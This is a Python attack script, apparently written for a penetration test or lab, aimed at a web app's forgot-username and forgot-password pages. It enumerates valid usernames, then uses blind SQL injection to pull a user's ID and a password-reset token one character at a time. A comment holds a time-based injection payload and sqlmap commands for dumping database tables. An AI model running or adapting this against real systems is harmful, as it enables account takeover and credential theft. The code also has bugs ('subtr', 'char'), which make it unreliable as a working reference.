#!/usr/bin/python

import requests

url = 'http://10.25.1.7:80'
username_list_fp = '/home/kaliAdmin/ey-vapt/username_list.txt'

proxies = {
	'http': '127.0.0.1:8080',
	'https': '127.0.0.1:8080'
}


def enumerate_user(s, username_list_fp):
	valid_users = []

	with open(username_list_fp) as f:
		for username in f:
			data = {"username":username.strip()}
			r = s.post(f"{url}/forgotusername.php", data=data)
			if 'User exists' in r.text:
				valid_users.append(username.strip())

	return valid_users


def forgot_password(s, username):
	data = {"username":username}
	r = s.post(f"{url}/forgotpassword.php", data=data)



def get_uid(s, username):
	'''	
	SQLi PoC:
	- 	POST /forgotusername.php
		username=';select+pg_sleep(5);+--+
	
	1. save Burp POST /forgotusername.php (remove cookie) to sqli-psot-req.txt
	2. Enumerate DB schemas: 
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --dbs
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --tables
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T users --columns
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --columns

	tables in SQL:
	- create table users(uid int4, username text, password text, description text);
	- create table tokens(uid int4, tid int4, token text);
	'''
	uid = ''
	for i in range(50):
		injection_string = f"{username}' and (select uid from users where username='{username}')={str(i)};-- "
		data = {"username":injection_string}
		r = s.post(f"{url}/forgotusername.php", data=data)
		if 'User exists' in r.text:
			uid = str(i)
			break
	return uid

def get_reset_token(s, uid, username):
	# sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --dump
	token = ''
	
	for i in range(50):
		for j in range(32,127):
			template_string = f"(select ascii(subtr(token,{i},1)) from tokens where uid={uid} limit 1)={j}"
			injection_string = f"{username}' and {template_string};-- "

			data = {"username":injection_string}
			r = s.post(f"{url}/forgotusername.php", data=data)
			if 'User exists' in r.text:
				token += char(j)
				break
	return token
	




def main():
	s = requests.Session()
	s.proxies.update(proxies)
	s.verify = False

	# estab pre-auth sess
	r = s.get(f"{url}")

	valid_users = enumerate_user(s, username_list_fp)

	# get admin password
	uid = get_uid(s, valid_users[1])


	# for username in valid_users:
	# 	forgot_password(username)




if __name__ == "__main__":
	main()
